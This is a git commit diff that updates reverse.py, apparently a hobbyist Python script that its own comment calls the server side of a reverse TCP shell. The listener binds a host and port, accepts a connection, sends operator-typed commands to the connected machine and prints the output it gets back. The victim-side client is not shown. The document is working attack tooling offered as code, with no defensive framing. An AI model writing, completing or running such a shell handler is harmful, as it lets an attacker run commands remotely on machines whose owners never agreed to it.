e42fb538ed8478c27bf4ab7c7217588fc3452bfc
talboris <48492947+talboris@users.noreply.github.com>
2019-05-30 18:35:06 +0300

    Update reverse.py

--- reverse.py
+++ reverse.py
@@ -1,18 +1,20 @@
-#server side
+#server side of the reverse tcp shell
 #not multi threading, so several commands dont work
-#doesnt work smoothly since implementation for python 3 is different and complicating for decoding and encoding
+#executing instruction : "c:\python script.py 127.0.0.1 65432"
 import socket
 import sys
 import subprocess as sp
 
-host = sys.argv[1]
-port = int(sys.argv[2]) 
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind((host, port))
+try:
+	host = sys.argv[1]
+	port = int(sys.argv[2]) #receiving host and port from user arguments
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
+	s.bind((host, port))
+except socket.error as er:
+	print("erron in socket           "+str(er))
 s.listen(100)
 conn,adrr = s.accept()
-print ("receiveing connection from :%s" %(str(adrr[0])))
+print ("receiveing connection from %s:%s" %(adrr[0],adrr[1]))
 
 while 1:
 	command = input("#> ")
@@ -21,7 +23,7 @@ while 1:
 			continue
 		command=command.encode()
 		conn.send(command)
-		result = conn.recv(100)
+		result = conn.recv(1024)
 		result=result.decode()
 # i must check the size of a date since tcp is received in chunks so one recv might be not enough, i check the size		
 		size=int(result[:16])
@@ -29,18 +31,15 @@ while 1:
 		print("size of buffer is %d" %(size))
 		testnum=len(message)
 		print("size of message is %d" %(testnum))
-		
-		
 		while size > len(message):
-			result = conn.recv(100)
+			print("i am here")
+			result = conn.recv(1024)
 			result=result.decode()
-			
-			
 			message+=result
-			message+="\r\n"
+		message=message.replace("\\r\\n","")
 		print (message)
 	else:
-		conn.send("exit()")
+		conn.send(b"exit()")
 		print ("the shell is going down..")
 		break
 s.close()
